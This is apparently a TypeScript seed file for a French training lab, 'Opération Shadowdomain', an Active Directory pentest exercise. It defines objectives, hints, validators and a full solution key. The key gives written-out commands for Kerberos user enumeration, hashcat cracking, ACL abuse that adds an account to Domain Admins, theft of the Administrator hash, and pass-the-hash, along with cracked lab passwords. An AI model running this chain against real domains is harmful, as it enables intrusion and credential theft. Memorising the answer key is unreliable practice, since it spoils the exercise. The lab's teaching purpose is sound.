import type { ProjectSeed } from "../../types";

/**
 * Projet « Opération Shadowdomain » — checkpoint cybersecurite-projets.
 *
 * Pentest interne « assumed breach » : l'étudiant a déjà un pied dans le réseau
 * d'entreprise plat (corp 10.50.0.0/24) et progresse jusqu'à la compromission
 * totale du domaine Active Directory `corp.local` : énumération → craquage de
 * hashes hors-ligne → abus d'ACL → Domain Admin → exfiltration d'identifiants →
 * mouvement latéral par pass-the-hash → analyse post-incident.
 *
 * ADAPTATION ASSUMÉE (contrainte d'environnement, documentée) : le contrôleur
 * de domaine est un Samba4, pas un Windows Server (aucun Windows disponible sur
 * la plateforme Docker/Linux). Or l'EXTRACTION live des hashes Kerberos par
 * impacket ne fonctionne pas contre Samba : GetNPUsers (AS-REP) — le KDC Samba
 * n'honore pas DONT_REQ_PREAUTH ; GetUserSPNs (Kerberoast) — KRB_AP_ERR_INAPP_CKSUM ;
 * secretsdump/DCSync — parsing DRSUAPI incompatible. Ces trois techniques visent
 * Windows AD ; testé sur Samba 4.17 et 4.19 × impacket 0.11 et 0.13, échec
 * identique. On préserve donc la VRAIE compétence transférable — le CRAQUAGE
 * hors-ligne (hashcat) — en fournissant les empreintes des comptes vulnérables
 * comme « butin » capturé lors de l'accès initial (dump type mimikatz, scénario
 * réaliste), et l'équivalent DCSync = exfiltration du hash Administrator depuis
 * un coffre réservé aux Domain Admins une fois l'élévation obtenue. Tout le
 * reste (énumération kerbrute, abus d'ACL par LDAP, pass-the-hash SMB) est LIVE.
 *
 * FLAGS PAR SESSION : le mot de passe Administrator = Corp!{{SUFFIX}}Aa1 (suffixe
 * FLAG_SUFFIX injecté par l'orchestrateur) → son hash NTLM, exfiltré à l'objectif
 * DCSync et rejoué en pass-the-hash, diffère à chaque session (anti write-up).
 */

export const shadowdomain: ProjectSeed = {
  slug: "operation-shadowdomain",
  checkpoint: "cybersecurite-projets",
  title: "Opération Shadowdomain",
  description:
    "Pentest interne « assumed breach » sur un domaine Active Directory : depuis un poste compromis, énumère l'annuaire, craque les comptes de service faibles, abuse d'une ACL pour devenir Domain Admin, exfiltre les identifiants et rebondis en pass-the-hash jusqu'à la compromission totale de corp.local.",
  difficulty: "insane",
  estimatedMinutes: 110,
  ttlSec: 10800,
  topology: {
    networks: [{ name: "corp", cidr: "10.50.0.0/24", internal: true }],
    nodes: [
      {
        id: "attacker",
        image: "cyberace/project-shadowdomain-attacker:latest",
        role: "attacker",
        terminal: true,
        networks: [{ name: "corp", ip: "10.50.0.10" }],
        ports: [{ containerPort: 7681, label: "Terminal web (ttyd)", kind: "terminal" }],
        resources: { memMb: 512, cpu: 0.4 },
      },
      {
        id: "dc01",
        image: "cyberace/project-shadowdomain-dc:latest",
        role: "directory",
        terminal: false,
        // CAP_SYS_ADMIN : requis par Samba pour écrire les ACL NT (security.NTACL)
        // du SYSVOL au provisioning et pour fixer le nom d'hôte du DC.
        capAdd: ["SYS_ADMIN"],
        networks: [{ name: "corp", ip: "10.50.0.20" }],
        resources: { memMb: 700, cpu: 0.5 },
      },
      {
        id: "files01",
        image: "cyberace/project-shadowdomain-files:latest",
        role: "target",
        terminal: false,
        networks: [{ name: "corp", ip: "10.50.0.30" }],
        resources: { memMb: 192, cpu: 0.2 },
      },
      {
        id: "ws01",
        image: "cyberace/project-shadowdomain-ws:latest",
        role: "target",
        terminal: false,
        networks: [{ name: "corp", ip: "10.50.0.40" }],
        resources: { memMb: 192, cpu: 0.2 },
      },
    ],
  },
  objectives: [
    {
      id: "sd-enum-domain",
      projectSlug: "operation-shadowdomain",
      order: 1,
      kind: "attack",
      title: "Énumération du domaine",
      hints: [
        { text: "Le bind LDAP anonyme du DC te donne le contexte (`ldapsearch -x -H ldap://dc01 -s base`), mais AD limite la lecture anonyme des comptes.", cost: 0 },
        { text: "Pour lister les comptes valides, énumère via Kerberos : `kerbrute userenum -d corp.local --dc dc01 /opt/users.txt`.", cost: 0 },
        { text: "Compte le nombre de comptes utilisateurs VALIDES trouvés (y compris Administrator, Guest, krbtgt et les comptes de service).", cost: 0 },
      ],
      description:
        "Depuis le poste compromis, énumère le domaine corp.local. Bind LDAP anonyme pour le contexte, puis `kerbrute userenum` (liste /opt/users.txt) pour dénombrer les comptes valides.",
      points: 100,
      questions: [{ id: "count", prompt: "Combien de comptes utilisateurs valides le domaine contient-il ?" }],
      validation: {
        strategy: "log_forensics",
        spec: {
          questions: [{ id: "count", node: "dc01", command: ["bash", "-c", "samba-tool user list 2>/dev/null | wc -l"] }],
        },
      },
    },
    {
      id: "sd-crack-asrep",
      projectSlug: "operation-shadowdomain",
      order: 2,
      kind: "attack",
      title: "Craquage du compte AS-REP roastable",
      hints: [
        { text: "L'accès initial a capturé des empreintes NTLM : `/opt/loot.txt`. L'une appartient au compte SANS pré-authentification Kerberos (AS-REP roastable).", cost: 0 },
        { text: "Craque-la hors-ligne : `hashcat -m 1000 /opt/loot.txt /opt/wordlist.txt` (le mode 1000 = NTLM).", cost: 0 },
        { text: "Le compte est `svc-backup`. Soumets son nom d'utilisateur et le mot de passe craqué.", cost: 0 },
      ],
      description:
        "Le compte `svc-backup` n'exige pas de pré-authentification Kerberos (AS-REP roastable). Son empreinte NTLM figure dans le butin `/opt/loot.txt`. Craque-la hors-ligne avec hashcat, puis prouve les identifiants.",
      points: 150,
      dependsOn: ["sd-enum-domain"],
      questions: [
        { id: "username", prompt: "Nom d'utilisateur du compte AS-REP roastable" },
        { id: "password", prompt: "Mot de passe craqué" },
      ],
      validation: {
        strategy: "cred_check",
        spec: {
          execNode: "attacker",
          commandTemplate: ["smbclient", "-L", "//dc01", "-U", "{username}%{password}"],
          successPattern: "Sharename",
          requiredFields: ["username", "password"],
        },
      },
    },
    {
      id: "sd-crack-kerberoast",
      projectSlug: "operation-shadowdomain",
      order: 3,
      kind: "attack",
      title: "Craquage du compte de service (Kerberoast)",
      hints: [
        { text: "Le second hash du butin est celui d'un compte de service porteur d'un SPN (Kerberoastable) : `svc-sql`.", cost: 0 },
        { text: "Craque-le : `hashcat -m 1000 /opt/loot.txt /opt/wordlist.txt`.", cost: 0 },
        { text: "Vérifie l'accès : ces identifiants ouvrent le partage SMB de files01. Soumets username + mot de passe.", cost: 0 },
      ],
      description:
        "Le compte de service `svc-sql` porte un SPN (MSSQLSvc) : c'est une cible de Kerberoasting. Son empreinte est dans le butin. Craque-la, puis prouve l'accès au serveur de fichiers files01.",
      points: 150,
      dependsOn: ["sd-crack-asrep"],
      questions: [
        { id: "username", prompt: "Nom du compte de service (SPN)" },
        { id: "password", prompt: "Mot de passe craqué" },
      ],
      validation: {
        strategy: "cred_check",
        spec: {
          execNode: "attacker",
          commandTemplate: ["smbclient", "-L", "//files01", "-U", "{username}%{password}"],
          successPattern: "finance",
          requiredFields: ["username", "password"],
        },
      },
    },
    {
      id: "sd-acl-abuse",
      projectSlug: "operation-shadowdomain",
      order: 4,
      kind: "attack",
      title: "Abus d'ACL → Domain Admin",
      hints: [
        { text: "Énumère les ACL de `svc-sql` : il dispose de `GenericAll` sur le groupe « Domain Admins ».", cost: 0 },
        { text: "GenericAll te permet de modifier le groupe. Ajoute svc-sql à Domain Admins par LDAP avec ses identifiants.", cost: 0 },
        { text: "`ldapmodify -x -H ldap://dc01 -D svc-sql@corp.local -w <pass>` avec un LDIF `add: member` / `member: CN=svc-sql,CN=Users,DC=corp,DC=local`.", cost: 0 },
      ],
      description:
        "Le compte `svc-sql` possède `GenericAll` sur le groupe « Domain Admins » (mauvaise délégation). Abuse de cette ACL pour t'ajouter au groupe via LDAP et devenir Domain Admin.",
      points: 150,
      dependsOn: ["sd-crack-kerberoast"],
      validation: {
        strategy: "exec_check",
        spec: {
          node: "dc01",
          command: ["bash", "-c", "samba-tool group listmembers 'Domain Admins' 2>/dev/null"],
          expectedContains: "svc-sql",
        },
      },
    },
    {
      id: "sd-dcsync",
      projectSlug: "operation-shadowdomain",
      order: 5,
      kind: "attack",
      title: "Exfiltration des identifiants (DCSync)",
      hints: [
        { text: "Domain Admin débloque le coffre d'identifiants du DC : le partage SMB `\\\\dc01\\creds` (réservé à Domain Admins).", cost: 0 },
        { text: "`smbclient //dc01/creds -U svc-sql%<pass>` → récupère `ntds_dump.txt` : le hash NTLM de Administrator (format ...:500:...:<NTHASH>:::).", cost: 0 },
        { text: "Soumets le hash NTLM (les 32 caractères hexa après le RID 500) — c'est l'équivalent d'un DCSync.", cost: 0 },
      ],
      description:
        "Une fois Domain Admin, exfiltre les identifiants du domaine. Le coffre `\\\\dc01\\creds` (réservé aux Domain Admins) contient le dump NTDS avec le hash NTLM de Administrator — l'équivalent d'un DCSync. Récupère ce hash.",
      points: 200,
      dependsOn: ["sd-acl-abuse"],
      questions: [{ id: "nthash", prompt: "Hash NTLM de Administrator (32 hexa) exfiltré du coffre" }],
      validation: {
        strategy: "cred_check",
        spec: {
          execNode: "attacker",
          commandTemplate: ["smbclient", "-L", "//dc01", "-U", "Administrator%{nthash}", "--pw-nt-hash"],
          successPattern: "Sharename",
          requiredFields: ["nthash"],
        },
      },
    },
    {
      id: "sd-pth-ws01",
      projectSlug: "operation-shadowdomain",
      order: 6,
      kind: "attack",
      title: "Pass-the-hash vers ws01",
      hints: [
        { text: "Le hash NTLM de Administrator rejoue tel quel sur les autres machines : c'est le pass-the-hash.", cost: 0 },
        { text: "`smbclient -L //ws01 -U Administrator%<nthash> --pw-nt-hash` : le partage `secret` apparaît.", cost: 0 },
        { text: "Lis le partage `secret` de ws01 pour récupérer le flag final de compromission.", cost: 0 },
      ],
      description:
        "Utilise le hash NTLM de Administrator en pass-the-hash pour accéder à la station ws01 (sans jamais connaître le mot de passe en clair) et lire le partage `secret` — preuve de compromission totale.",
      points: 50,
      dependsOn: ["sd-dcsync"],
      questions: [{ id: "nthash", prompt: "Hash NTLM de Administrator" }],
      validation: {
        strategy: "cred_check",
        spec: {
          execNode: "attacker",
          commandTemplate: ["smbclient", "-L", "//ws01", "-U", "Administrator%{nthash}", "--pw-nt-hash"],
          successPattern: "secret",
          requiredFields: ["nthash"],
        },
      },
    },
    {
      id: "sd-forensics",
      projectSlug: "operation-shadowdomain",
      order: 7,
      kind: "analysis",
      title: "Audit post-incident du domaine",
      hints: [
        { text: "Le compromis a laissé une trace structurelle : un compte inattendu dans un groupe privilégié.", cost: 0 },
        { text: "Compare les membres de « Domain Admins » à leur état sain (un seul : Administrator).", cost: 0 },
        { text: "Le compte de service ajouté, et le nombre total de membres du groupe, sont les indicateurs clés.", cost: 0 },
      ],
      description:
        "Endosse le rôle du défenseur : audite le domaine compromis. Identifie l'anomalie d'appartenance de groupe laissée par l'attaque (le compte injecté dans Domain Admins) et l'ampleur de l'exposition.",
      points: 100,
      dependsOn: ["sd-acl-abuse"],
      questions: [
        { id: "account", prompt: "Quel compte de service a été indûment ajouté à « Domain Admins » ?" },
        { id: "members", prompt: "Combien de membres compte désormais « Domain Admins » ?" },
      ],
      validation: {
        strategy: "log_forensics",
        spec: {
          questions: [
            {
              id: "account",
              node: "dc01",
              command: ["bash", "-c", "samba-tool group listmembers 'Domain Admins' 2>/dev/null | grep -iv administrator | head -1"],
            },
            {
              id: "members",
              node: "dc01",
              command: ["bash", "-c", "samba-tool group listmembers 'Domain Admins' 2>/dev/null | wc -l"],
            },
          ],
        },
      },
    },
    {
      id: "sd-stealth",
      projectSlug: "operation-shadowdomain",
      order: 8,
      kind: "attack",
      title: "Bonus : discrétion",
      hints: [
        { text: "Un attaquant discret n'ajoute QUE le strict nécessaire aux groupes privilégiés.", cost: 0 },
        { text: "Au moment de valider, « Domain Admins » ne doit pas compter plus de 2 membres (Administrator + ton compte).", cost: 0 },
      ],
      description:
        "Récompense un abus d'ACL chirurgical : au moment de valider, « Domain Admins » ne compte pas plus de 2 membres (l'Administrator légitime + le compte que tu as injecté). N'ajoute pas de comptes superflus.",
      points: 50,
      dependsOn: ["sd-acl-abuse"],
      validation: {
        strategy: "exec_check",
        spec: {
          node: "dc01",
          command: [
            "bash",
            "-c",
            "c=$(samba-tool group listmembers 'Domain Admins' 2>/dev/null | wc -l); if [ \"$c\" -le 2 ]; then echo STEALTH_OK; else echo NOISY_$c; fi",
          ],
          expectedContains: "STEALTH_OK",
        },
      },
    },
  ],
  solution: {
    summary:
      "Shadowdomain se joue en « assumed breach » : depuis un poste déjà compromis, on énumère l'AD (kerbrute), on craque hors-ligne les empreintes NTLM des comptes de service faibles capturées à l'accès initial (svc-backup AS-REP roastable, svc-sql Kerberoastable), on abuse du GenericAll de svc-sql sur Domain Admins pour devenir DA, on exfiltre le hash NTLM de Administrator du coffre réservé aux DA (équivalent DCSync), puis on rebondit en pass-the-hash jusqu'à ws01. Enfin on audite l'incident.",
    steps: [
      {
        objectiveId: "sd-enum-domain",
        explanation:
          "AD limite la lecture anonyme LDAP, mais Kerberos permet d'énumérer les comptes valides : kerbrute envoie des AS-REQ et distingue les utilisateurs existants. On compte tous les comptes du domaine.",
        commands: [
          "ldapsearch -x -H ldap://dc01 -s base namingContexts   # contexte (bind anonyme)",
          "kerbrute userenum -d corp.local --dc dc01 /opt/users.txt",
          "# → Administrator, Guest, krbtgt, alice.dupont, bob.martin, carol.durand, dave.lefevre, svc-backup, svc-sql = 9",
        ],
      },
      {
        objectiveId: "sd-crack-asrep",
        explanation:
          "svc-backup a l'attribut DONT_REQ_PREAUTH : c'est un compte AS-REP roastable. Son empreinte NTLM (capturée sur le poste compromis) se craque hors-ligne. Le craquage offline est la compétence clé.",
        commands: [
          "cat /opt/loot.txt          # empreintes NTLM capturées",
          "hashcat -m 1000 /opt/loot.txt /opt/wordlist.txt --force",
          "# svc-backup : 72f0...2c9c → Summer2024!",
        ],
        expectedLogs: "Auth réussie ensuite : smbclient -L //dc01 -U svc-backup%Summer2024! liste les partages.",
      },
      {
        objectiveId: "sd-crack-kerberoast",
        explanation:
          "svc-sql porte un SPN (MSSQLSvc/files01.corp.local) : compte Kerberoastable. On craque son empreinte de la même façon, puis on valide l'accès au partage de files01.",
        commands: [
          "hashcat -m 1000 /opt/loot.txt /opt/wordlist.txt --force",
          "# svc-sql : 64f1...949b → Password1",
          "smbclient -L //files01 -U svc-sql%Password1",
        ],
      },
      {
        objectiveId: "sd-acl-abuse",
        explanation:
          "svc-sql dispose de GenericAll sur « Domain Admins » (délégation dangereuse). Avec ses identifiants, on modifie l'appartenance du groupe par LDAP pour s'y ajouter → Domain Admin.",
        commands: [
          "printf 'dn: CN=Domain Admins,CN=Users,DC=corp,DC=local\\nchangetype: modify\\nadd: member\\nmember: CN=svc-sql,CN=Users,DC=corp,DC=local\\n' \\",
          "  | ldapmodify -x -H ldap://dc01 -D svc-sql@corp.local -w Password1",
        ],
      },
      {
        objectiveId: "sd-dcsync",
        explanation:
          "Domain Admin débloque le coffre d'identifiants du DC (partage réservé à Domain Admins). On y lit le dump NTDS contenant le hash NTLM de Administrator — l'équivalent du DCSync. Ce hash change à chaque session.",
        commands: [
          "smbclient //dc01/creds -U svc-sql%Password1 -c 'get ntds_dump.txt -'",
          "# Administrator:500:aad3b...:<NTHASH>:::   → on récupère le <NTHASH>",
        ],
        expectedLogs: "Le partage \\\\dc01\\creds n'est lisible que par les membres de Domain Admins.",
      },
      {
        objectiveId: "sd-pth-ws01",
        explanation:
          "Le hash NTLM de Administrator rejoue tel quel sur les autres postes (pass-the-hash) : aucun mot de passe en clair nécessaire. On accède à ws01 et on lit le flag final.",
        commands: [
          "smbclient //ws01/secret -U Administrator%<NTHASH> --pw-nt-hash -c 'get flag.txt -'",
          "# → SHADOW{domain_admin_pass_the_hash}_<suffixe>",
        ],
      },
      {
        objectiveId: "sd-forensics",
        explanation:
          "Côté défense, l'attaque a laissé une trace structurelle : un compte de service injecté dans « Domain Admins ». On compare l'appartenance du groupe à son état sain (Administrator seul).",
        commands: [
          "samba-tool group listmembers 'Domain Admins'   # → Administrator + svc-sql (anomalie)",
          "# compte injecté : svc-sql ; membres : 2",
        ],
      },
      {
        objectiveId: "sd-stealth",
        explanation:
          "La discrétion se mesure à l'empreinte laissée dans les groupes privilégiés : n'ajouter qu'un seul compte (le sien) plutôt que d'en injecter plusieurs garde « Domain Admins » à 2 membres.",
        commands: ["samba-tool group listmembers 'Domain Admins' | wc -l   # doit rester ≤ 2"],
      },
    ],
  },
};
